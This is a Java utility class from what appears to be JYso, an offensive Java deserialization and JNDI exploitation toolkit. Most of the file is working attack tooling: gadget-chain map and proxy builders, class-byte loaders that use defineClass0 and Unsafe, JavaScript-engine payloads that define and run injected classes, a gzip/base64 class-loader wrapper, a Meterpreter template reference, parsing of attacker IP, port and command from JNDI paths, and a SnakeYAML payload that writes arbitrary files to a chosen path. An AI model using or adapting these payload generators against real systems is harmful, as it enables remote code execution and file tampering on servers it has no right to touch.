package com.qi4l.JYso.gadgets.utils;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Random;
import java.util.zip.Deflater;
import java.util.zip.GZIPOutputStream;

import java.io.InputStream;
import java.lang.reflect.*;
import java.util.*;

import static com.qi4l.JYso.gadgets.Config.Config.*;
import static com.qi4l.JYso.gadgets.utils.Gadgets.createMemoizedInvocationHandler;
import static com.qi4l.JYso.gadgets.utils.handle.ClassMethodHandler.insertMethod;
import static com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler.generateClassName;
import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.shrinkBytes;

@SuppressWarnings({"unused"})
public class Utils {
    private static final Logger log = LogManager.getLogger(Utils.class);

    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<>();
        map.put(key, val);
        return map;
    }
    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(TemplatesUtil.class.getClassLoader(), allIfaces, ih));
    }

    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static Class<?> makeClass(String clazzName) {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class<?> clazz;
        try {
            clazz = ctClass.toClass();
        } catch (CannotCompileException e) {
            throw new RuntimeException(e);
        }
        ctClass.defrost();
        return clazz;
    }

    public static String[] handlerCommand(String command) {
        String info = command.split("-")[1];
        int index = info.indexOf("#");
        String par1 = info.substring(0, index);
        String par2 = info.substring(index + 1);
        return new String[]{par1, par2};
    }

    public static String base64Decode(String bs) {
        Class<?> base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", Class.class).invoke(base64, Class[].class);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }

        if (value != null) {
            return new String(value);
        }
        return bs;
    }

    public static void saveCtClassToFile(CtClass ctClass) throws Exception {
        // 总体在进行类字节码的缩短
        shrinkBytes(ctClass);
        byte[] classBytes = ctClass.toBytecode();
    }

    public static void loadClassTest(byte[] classBytes, String className) throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method method = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);
        Class<?> clazz = (Class<?>) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);

        try {
            clazz.newInstance();
        } catch (Exception ignored) {
            Class<?> unsafe = Class.forName("sun.misc.Unsafe");
            Field theUnsafeField = unsafe.getDeclaredField("theUnsafe");
            theUnsafeField.setAccessible(true);
            Object unsafeObject = theUnsafeField.get(null);
            unsafeObject.getClass().getDeclaredMethod("allocateInstance", Class.class).invoke(unsafeObject, clazz);
        }
    }

    public static String generateBCELFormClassBytes(byte[] bytes) throws Exception {
        return "$$BCEL$$" + Utility.encode(bytes, true);
    }

    public static String getJSEngineValue(byte[] classBytes) throws Exception {
        if (USING_RHINO) {
            return "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"" + generateBCELFormClassBytes(classBytes) + "\").newInstance();";
        } else {
            return "var data = \"" + base64Encode(classBytes) + "\";var dataBytes=java.util.Base64.getDecoder().decode(data);var cl= java.lang.Thread.currentThread().getContextClassLoader();var clClass = cl.getClass();var defineClassMethod = null;while (clClass != null) {try {defineClassMethod = clClass.getDeclaredMethod(\"defineClass\", dataBytes.getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);defineClassMethod.setAccessible(true);break;} catch (e) {clClass = clClass.getSuperclass();}}if (defineClassMethod != null) {var memClass = defineClassMethod.invoke(cl, dataBytes, 0, dataBytes.length);memClass.newInstance();} else {throw \"Cannot find defineClass method.\";}";
        }
    }

    public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes) throws Exception {
        CtClass ctClass = POOL.get("com.qi4l.JYso.template.ClassLoaderTemplate");
        ctClass.setName(generateClassName());
        ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
        gzipOutputStream.write(bytes);
        gzipOutputStream.close();

        String b64 = Base64.encodeBase64String(outBuf.toByteArray());
        // 如果 b64 的长度比较大，则将其切分为多个字符串进行拼接，避免单个字符串过长
        StringBuilder code = new StringBuilder();
        if (b64.length() > 60000) {
            String[] arrays = splitString(b64, 60000);
            for (int i = 0; i < arrays.length; i++) {
                if (i == 0) {
                    code.append("b64=\"").append(arrays[0]).append("\";\n");
                } else {
                    code.append("b64 +=\"").append(arrays[i]).append("\";\n");
                }
            }
        } else {
            code.append("b64=\"").append(b64).append("\";\n");
        }

        // 将赋值的代码插入到 ClassLoaderTemplate 中
        insertMethod(ctClass, "initClassBytes", code.toString());
        return ctClass;
    }

    public static void writeClassToFile(String fileName, byte[] classBytes) throws Exception {
        File file = new File(fileName.replace(".", File.separator) + ".class");
        File parentDir = file.getParentFile();
        if (!parentDir.exists()) {
            if (!parentDir.mkdirs()) {
                // 创建文件夹失败
                return;
            }
        }
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        fileOutputStream.write(classBytes);
        fileOutputStream.flush();
        fileOutputStream.close();
    }

    public static String[] splitString(String str, int chunkSize) {
        if (str == null || str.isEmpty() || chunkSize <= 0) {
            return null;
        }
        int len = str.length();
        int arrayLen = (len + chunkSize - 1) / chunkSize;
        String[] result = new String[arrayLen];
        int k = 0;
        for (int i = 0; i < len; i += chunkSize) {
            int endIndex = Math.min(i + chunkSize, len);
            result[k++] = str.substring(i, endIndex);
        }
        return result;
    }

    public static String base64Encode(byte[] bs) {
        Class<?> base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", new Class[]{}).invoke(null, (Object[]) null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    public static String getRandomString() {
        String str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 10; i++) {
            char ch = str.charAt(new Random().nextInt(str.length()));
            sb.append(ch);
        }
        return sb.toString();
    }

    public static String getClassCode(Class<?> clazz) throws Exception {
        byte[] bytes;
        if (clazz.getName().equals("com.feihong.ldap.template.com.qi4l.JYso.template.Meterpreter")) {
            bytes = ClassByteChange.update();

        } else {
            bytes = getClassBytes(clazz);
        }


        return base64Encode(bytes);
    }

    public static byte[] getClassBytes(Class<?> clazz) throws Exception {
        String className = clazz.getName();
        String resourcePath = className.replaceAll("\\.", "/") + ".class";
        InputStream in = Utils.class.getProtectionDomain().getClassLoader().getResourceAsStream(resourcePath);
        if (in != null) {
            return getBytes(in);
        }
        return new byte[0];
    }

    static byte[] getBytes(InputStream in) throws IOException {
        byte[] bytes = new byte[1024];
        ByteArrayOutputStream bayous = new ByteArrayOutputStream();
        int len;
        while ((len = in.read(bytes)) != -1) {
            bayous.write(bytes, 0, len);
        }

        in.close();
        bayous.close();

        return bayous.toByteArray();
    }

    public static byte[] serialize(Object ref) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);
        return out.toByteArray();
    }

    public static String getCmdFromBase(String base) throws Exception {
        int firstIndex = base.lastIndexOf("/");
        String cmd = base.substring(firstIndex + 1);

        int secondIndex = base.lastIndexOf("/", firstIndex - 1);
        if (secondIndex < 0) {
            secondIndex = 0;
        }

        if (base.substring(secondIndex + 1, firstIndex).equalsIgnoreCase("base64")) {
            byte[] bytes = base64Decode(cmd).getBytes();
            cmd = new String(bytes);
        }

        return cmd;
    }

    public static String[] getIPAndPortFromBase(String base) throws NumberFormatException {
        int firstIndex = base.lastIndexOf("/");
        String port = base.substring(firstIndex + 1);

        int secondIndex = base.lastIndexOf("/", firstIndex - 1);
        if (secondIndex < 0) {
            secondIndex = 0;
        }

        String ip = base.substring(secondIndex + 1, firstIndex);
        return new String[]{ip, Integer.parseInt(port) + ""};
    }

    public static String createPoC(String srcPath, String destPath) throws Exception {

        File file = new File(srcPath);
        long FileLength = file.length();
        byte[] FileContent = new byte[(int) FileLength];
        try {
            FileInputStream in = new FileInputStream(file);
            in.read(FileContent);
            in.close();
        } catch (FileNotFoundException e) {
            log.error("e: ", e);
        }
        byte[] compressBytes = compress(FileContent);
        return "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\"" + destPath + "\"],false],!!java.util.zip.Inflater  { input: !!binary " + Utils.base64Encode(compressBytes) + " },1048576]]";
    }

    public static byte[] compress(byte[] data) {
        byte[] output = new byte[0];

        Deflater compresser = new Deflater();

        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length)) {
            try {
                byte[] buf = new byte[1024];
                while (!compresser.finished()) {
                    int i = compresser.deflate(buf);
                    bos.write(buf, 0, i);
                }
                output = bos.toByteArray();
            } catch (Exception e) {
                output = data;
                log.error("e: ", e);
            }
        } catch (IOException e) {
            log.error("e: ", e);
        }
        compresser.end();
        return output;
    }
}
